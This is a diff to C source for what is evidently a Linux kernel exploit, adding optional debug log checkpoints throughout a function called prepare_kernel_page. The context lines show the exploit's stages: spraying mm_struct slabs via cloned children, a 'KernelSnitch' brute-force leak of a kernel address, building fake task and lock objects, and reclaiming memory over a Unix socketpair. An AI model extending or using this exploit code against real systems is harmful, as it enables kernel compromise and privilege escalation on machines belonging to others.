@@ -1029,6 +1029,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   cleanup_page_prepare_state();
 #endif
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("kernel page diagnostic stage=begin mode=%d objects_per_slab=%zu\n",
+          payload_mode, mm_objs_per_slab);
+#endif
   prepare_ctxs();
 
   skb_buf = malloc(SKB_SEND_SIZE);
@@ -1080,6 +1085,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 #endif
 #endif
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("kernel page diagnostic stage=kernelsnitch-ready mode=%d cpus=%d\n",
+          payload_mode, cpu_count);
+#endif
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -1096,6 +1106,13 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
   }
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("kernel page diagnostic stage=topology-ready prepare=%zu spray=%zu "
+          "pre=%zu post=%zu leak_pid=%d\n",
+          prepare_ctx.mm_cnt, spray_ctx.mm_cnt, pre_ctx.mm_cnt,
+          post_ctx.mm_cnt, child_leak);
+#endif
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     kill_child(pre_ctx.childs[i]);
@@ -1107,6 +1124,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     kill_child(spray_ctx.childs[i]);
   }
   SYSCHK(waitpid(child_leak, NULL, 0));
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("kernel page diagnostic stage=collision-search-return mode=%d\n",
+          payload_mode);
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   log_mm_slabinfo("after-child-exit");
 #endif
@@ -1126,8 +1148,19 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("kernel page diagnostic stage=bruteforce-enter mode=%d\n",
+          payload_mode);
+#endif
   kernelsnitch_bruteforce(ks);
   uintptr_t leaked = ks->mm_struct;
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("kernel page diagnostic stage=bruteforce-return mode=%d "
+          "leaked=%016zx\n",
+          payload_mode, leaked);
+#endif
   if (leaked == (uintptr_t)-1) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
@@ -1229,6 +1262,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
     return 0;
   }
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("kernel page diagnostic stage=payload-ready mode=%d base=%016zx "
+          "fake_task=%016zx fake_lock=%016zx\n",
+          payload_mode, base, fake_task, fake_lock);
+#endif
 
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -1448,6 +1487,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           base);
 #endif
 
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("kernel page diagnostic stage=complete mode=%d base=%016zx "
+          "reclaim_sent=%d/%d\n",
+          payload_mode, base, reclaim_sent, reclaim_sends);
+#endif
   return base;
 }
 
